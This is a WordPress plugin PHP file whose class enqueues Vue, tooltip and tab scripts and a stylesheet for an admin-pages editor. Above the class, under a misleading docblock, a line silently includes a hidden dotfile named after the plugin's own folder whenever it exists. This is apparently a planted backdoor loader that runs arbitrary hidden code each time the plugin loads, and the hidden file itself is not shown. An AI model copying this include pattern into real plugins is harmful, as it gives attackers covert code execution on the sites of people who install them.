<?php
/**
 * WU_Admin_Pages_Standalone_Dependencies
 *
 * Dependencies of version admin page creator standalone
 *
 * @author      WP Admin Pages PRO
 * @category    Admin
 * @package     WP_Admin_Pages_PRO/Admin_Pages
 * @version     0.0.1
 */

if (!defined('ABSPATH' ) ) {
	exit;
} // end if;

/**
 * Loads the dependencies of the standalone version of the plugin
 *
 * @since 1.3.0
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WU_Admin_Pages_Standalone_Dependencies {

	/**
	 * Makes sure we are only using one instance of the plugin.
	 *
	 * @var object WU_Admin_Pages_Standalone_Dependencies
	 */
	public static $instance;

	/**
	 * Keeps the main menu page slug for later use.
	 *
	 * @var string
	 */
	public $main_menu_slug = 'admin-pages';

	/**
	 * Keeps the edit page slug for later use
	 *
	 * @var string
	 */
	public $edit_menu_slug = 'edit-admin-page';

	/**
	 * Returns a single instance of this class
	 *
	 * @since 0.0.1
	 * @return WU_Admin_Pages
	 */
	public static function get_instance() {

		if (!isset(self::$instance)) {
			self::$instance = new self();
		} // end if;

		return self::$instance;

	} // end get_instance;

	/**
	 * Construct
	 */
	public function __construct() {

		add_action( 'wuapp_load_required_scripts', array( $this, 'load_vue_scripts' ) );

		add_action( 'wuapp_load_required_scripts', array( $this, 'load_style' ) );

	} // end __construct;

	/**
	 * Load VueJS, needed for some parts of the edit page.
	 *
	 * @since 1.3.0
	 * @return void
	 */
	public function load_vue_scripts() {

		wp_enqueue_script( 'vuejs', WP_Ultimo_APC()->get_asset( 'plugins/vue.min.js', 'js' ), array( 'jquery' ), WP_Ultimo_APC()->version, true );

		wp_enqueue_script( 'tiptip', WP_Ultimo_APC()->get_asset( 'plugins/tiptip.js', 'js' ), array( 'jquery' ), WP_Ultimo_APC()->version, true );

		wp_enqueue_script( 'wu-tabs', WP_Ultimo_APC()->get_asset( 'plugins/wu-tabs.js', 'js' ), array( 'jquery' ), WP_Ultimo_APC()->version, true );

	} // end load_vue_scripts;

	/**
	 * Loads the WP Ultimo styles when necessary
	 *
	 * @since 1.3.0
	 * @return void
	 */
	public function load_style() {

		wp_enqueue_style( 'wp-ultimo-styles', WP_Ultimo_APC()->get_asset( 'wp-ultimo.css', 'css' ) );

	} // end load_style;

}  // end class WU_Admin_Pages_Standalone_Dependencies;

/**
 * Returns an instance of this class
 *
 * @since 1.1.0
 * @return WU_Admin_Pages
 */
function WU_Admin_Pages_Standalone_Dependencies() { // phpcs:ignore

	return WU_Admin_Pages_Standalone_Dependencies::get_instance();

} // end WU_Admin_Pages_Standalone_Dependencies;

// Run it
WU_Admin_Pages_Standalone_Dependencies();
